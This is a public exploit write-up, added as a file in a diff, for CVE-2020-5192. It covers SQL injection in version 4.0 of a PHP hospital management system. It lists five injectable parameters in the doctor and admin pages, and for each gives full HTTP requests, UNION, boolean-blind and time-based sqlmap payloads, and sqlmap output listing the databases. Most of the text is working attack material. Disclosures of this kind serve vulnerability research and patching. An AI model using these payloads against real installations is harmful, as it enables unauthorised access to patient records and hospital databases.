@@ -1,0 +1,166 @@
+# Exploit Title: Hospital Management System 4.0 - 'searchdata' SQL Injection
+# Google Dork: N/A
+# Date: 2020-01-02
+# Exploit Author: FULLSHADE
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/hospital-management-system-in-php/
+# Version: v4.0
+# Tested on: Windows
+# CVE : CVE-2020-5192
+
+# The Hospital Management System 4.0 web application is vulnerable to
+# SQL injection in multiple areas, listed below are 5 of the prominent
+# and easy to exploit areas.
+
+================================ 1 - SQLi ================================
+
+POST /hospital/hospital/hms/doctor/search.php HTTP/1.1
+Host: 10.0.0.214
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+Origin: https://10.0.0.214
+DNT: 1
+Connection: close
+Referer: https://10.0.0.214/hospital/hospital/hms/doctor/search.php
+Cookie: PHPSESSID=301tn3sqt3gmimkc9epe7kjha5
+Upgrade-Insecure-Requests: 1
+
+searchdata=&search=
+
+?searchdata parameter is vulnerable to SQL injection under the search feature in the doctor login.
+
+POST parameter 'searchdata' is vulnerable.
+sqlmap identified the following injection point(s) with a total of 120 HTTP(s) requests:
+---
+Parameter: searchdata (POST)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: searchdata=' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('qvxbq','zIuFTDXhtLrbZmAXQXxIalrRpZgCjsPnduKboFfW'),'qpqjq'),NULL-- PqeG&search=
+---
+[15:49:58] [INFO] testing MySQL
+[15:49:58] [INFO] confirming MySQL
+[15:49:58] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.41, PHP 7.4.1
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[15:49:58] [INFO] fetching database names
+available databases [6]:
+[*] hms
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+
+================================ 2 - SQLi ================================
+
+GET parameter 'viewid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
+---
+Parameter: viewid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: viewid=6' AND 3413=3413 AND 'nBkv'='nBkv
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: viewid=6' AND SLEEP(5) AND 'PJim'='PJim
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: viewid=6' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162767071,0x7957464b6f4a78624b536a75497051715a71587353746a4b6e45716441646345614f725449555748,0x717a717a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- XNyp
+
+[15:54:21] [INFO] fetching database names
+available databases [6]:
+[*] hms
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+
+GET /hospital/hospital/hms/doctor/view-patient.php?viewid=6 HTTP/1.1
+Host: 10.0.0.214
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=301tn3sqt3gmimkc9epe7kjha5
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+?viewid parameter is vulnerable to SQLi while viewing a patient under the doctor login
+
+================================ 3 - SQLi ================================
+
+Parameter: bs (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: bp=123&bs=123' AND SLEEP(5) AND 'CKbI'='CKbI&weight=123&temp=123&pres=123&submit=
+
+?bs parameter is vulnerable to SQL injection on the doctors login when adding medical history to a patient
+
+================================ 4 - SQLi ================================
+
+POST /hospital/hospital/hms/doctor/add-patient.php HTTP/1.1
+Host: 10.0.0.214
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://10.0.0.214/hospital/hospital/hms/doctor/add-patient.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 111
+Origin: https://10.0.0.214
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=301tn3sqt3gmimkc9epe7kjha5
+Upgrade-Insecure-Requests: 1
+
+patname=
+
+patname parameter is vulnerable to SQLi under the add patient in the doctor login
+
+================================ 5 - SQLi ================================
+
+---
+Parameter: cpass (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: cpass=123' AND 4808=4808#&npass=123&cfpass=123&submit=123
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cpass=123' AND SLEEP(5)-- taxP&npass=123&cfpass=123&submit=123
+---
+available databases [6]:
+[*] hms
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+
+POST /hospital/hospital/hms/admin/change-password.php HTTP/1.1
+Host: 10.0.0.214
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Origin: http://10.0.0.214
+DNT: 1
+Connection: close
+Referer: http://10.0.0.214/hospital/hospital/hms/admin/change-password.php
+Cookie: PHPSESSID=g1mpom762nglpeptn51b4rg5h5
+Upgrade-Insecure-Requests: 1
+
+cpass=123&npass=123&cfpass=123&submit=123
+
+the ?cpass parameter is vulnerable to blind SQL injection
